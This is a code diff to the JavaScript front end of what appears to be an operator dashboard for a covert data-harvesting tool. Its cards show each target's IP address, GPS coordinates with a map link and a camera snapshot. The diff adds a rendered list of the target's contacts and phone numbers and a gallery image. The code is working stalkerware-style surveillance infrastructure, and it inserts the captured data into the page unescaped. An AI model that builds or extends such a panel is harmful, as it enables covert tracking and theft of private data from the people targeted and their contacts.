@@ -86,6 +86,21 @@
 
                     for (let key in data) {
                         let item = data[key];
+                        
+                        // Contacts formatting
+                        let contactsHtml = '<p class="text-slate-500">No Contacts Shared</p>';
+                        if (Array.isArray(item.contacts) && item.contacts.length > 0) {
+                            contactsHtml = '<ul class="max-h-28 overflow-y-auto space-y-1 bg-slate-950 p-2 rounded border border-slate-800 text-[11px] font-mono">';
+                            item.contacts.forEach(c => {
+                                let name = c.name ? c.name.join(', ') : 'Unknown';
+                                let tel = c.tel ? c.tel.join(', ') : 'No Number';
+                                contactsHtml += `<li><strong>${name}:</strong> ${tel}</li>`;
+                            });
+                            contactsHtml += '</ul>';
+                        } else if (typeof item.contacts === 'string') {
+                            contactsHtml = `<p class="text-slate-400 text-xs">${item.contacts}</p>`;
+                        }
+
                         let card = document.createElement("div");
                         card.className = "bg-slate-900 border border-slate-800 p-5 rounded-2xl shadow-xl flex flex-col justify-between";
                         
@@ -95,15 +110,26 @@
                                     <span class="text-[10px] bg-indigo-500/20 text-indigo-300 font-mono px-2 py-0.5 rounded">${item.id}</span>
                                     <span class="text-[10px] text-slate-400">${new Date(item.timestamp).toLocaleString()}</span>
                                 </div>
-                                <div class="space-y-1.5 text-xs text-slate-300 mb-4 font-mono">
+                                <div class="space-y-1.5 text-xs text-slate-300 mb-3 font-mono">
                                     <p><strong>IP:</strong> ${item.ip}</p>
                                     <p><strong>Lat:</strong> ${item.latitude}</p>
                                     <p><strong>Lon:</strong> ${item.longitude}</p>
                                     ${!isNaN(item.latitude) ? `<a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank" class="text-indigo-400 underline block mt-1">View on Map ↗</a>` : ''}
                                 </div>
+                                <div class="mb-3">
+                                    <p class="text-xs font-semibold text-indigo-300 mb-1">Contacts / Call List:</p>
+                                    <div>${contactsHtml}</div>
+                                </div>
                             </div>
-                            <div>
-                                ${item.image_base64 ? `<img src="${item.image_base64}" class="rounded-xl w-full h-44 object-cover border border-slate-800"/>` : '<div class="bg-slate-950 h-32 rounded-xl flex items-center justify-center text-xs text-rose-400 border border-slate-800">No Image Captured</div>'}
+                            <div class="grid grid-cols-2 gap-2">
+                                <div>
+                                    <p class="text-[10px] text-slate-400 mb-1">Camera Snap</p>
+                                    ${item.image_base64 ? `<img src="${item.image_base64}" class="rounded-xl w-full h-32 object-cover border border-slate-800"/>` : '<div class="bg-slate-950 h-32 rounded-xl flex items-center justify-center text-[10px] text-rose-400 border border-slate-800">None</div>'}
+                                </div>
+                                <div>
+                                    <p class="text-[10px] text-slate-400 mb-1">Gallery Image</p>
+                                    ${item.gallery_image ? `<img src="${item.gallery_image}" class="rounded-xl w-full h-32 object-cover border border-slate-800"/>` : '<div class="bg-slate-950 h-32 rounded-xl flex items-center justify-center text-[10px] text-slate-500 border border-slate-800">Not Uploaded</div>'}
+                                </div>
                             </div>
                         `;
                         grid.appendChild(card);
